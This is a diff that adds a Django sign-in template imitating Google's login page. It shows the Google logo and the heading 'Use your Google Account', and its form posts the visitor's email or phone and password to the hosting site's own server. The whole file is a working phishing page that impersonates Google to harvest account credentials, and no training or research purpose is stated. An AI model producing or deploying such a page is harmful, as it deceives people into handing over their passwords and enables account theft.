@@ -1,0 +1,45 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href ="{% static 'css/signin.css' %}">
+    <title>Sign in</title>
+</head>
+<body>
+    <div class="container">
+        <div class = "centered-box">
+            
+            <div class="columns">
+                <div class="column">
+                    <img src = "https://www.freepnglogos.com/uploads/google-logo-png/google-logo-png-webinar-optimizing-for-success-google-business-webinar-13.png">
+                    <h1>Sign in</h1>
+                    <h2>Use your Google Account</h2>   
+                </div>
+                <div class="column">
+                    <form method="post">
+                        {% csrf_token %}
+                        <div class="form-group">
+                            <label for="email">Email or phone</label>
+                            <input type="text" id="email" name="email" placeholder="Email or phone" class="form-control">
+                            
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <input type="password" id="password" name ="password" placeholder="Password" class="form-control">
+                        </div>
+                        <div class="forgot">
+                            <a href="#">Forgot email or password?</a>
+                        </div>
+                        <div class="next">
+                            <button type="submit">Sign in</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
